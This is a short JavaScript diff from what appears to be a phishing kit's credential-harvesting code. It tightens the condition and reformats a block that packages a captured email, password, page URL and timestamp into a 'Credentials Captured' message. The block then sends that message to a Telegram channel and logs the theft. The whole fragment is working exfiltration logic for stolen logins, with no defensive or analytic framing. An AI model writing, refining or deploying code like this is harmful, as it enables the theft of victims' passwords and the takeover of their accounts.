@@ -436,15 +436,15 @@ try {
                 } catch (e) {}
             }
 
-            if (email || password) {
-                const msg = `🔐 *Credentials Captured*\n\n` +
-                            `📧 *Email:* ${email || 'N/A'}\n` +
-                            `🔑 *Password:* ${password || 'N/A'}\n` +
-                            `🌐 *URL:* ${originalUrl}\n` +
-                            `🕐 *Time:* ${new Date().toISOString()}`;
-                sendToTelegram(msg).catch(error => console.error('Telegram send failed:', error));
-                console.log(`[TELEGRAM] Sent credentials for ${email || 'unknown'}`);
-            }
+            if (email && password) {
+    const msg = `🔐 *Credentials Captured*\n\n` +
+                `📧 *Email:* ${email}\n` +
+                `🔑 *Password:* ${password}\n` +
+                `🌐 *URL:* ${originalUrl}\n` +
+                `🕐 *Time:* ${new Date().toISOString()}`;
+    sendToTelegram(msg).catch(error => console.error('Telegram send failed:', error));
+    console.log(`[TELEGRAM] Sent credentials for ${email}`);
+}
         }
     }
 } catch (e) {
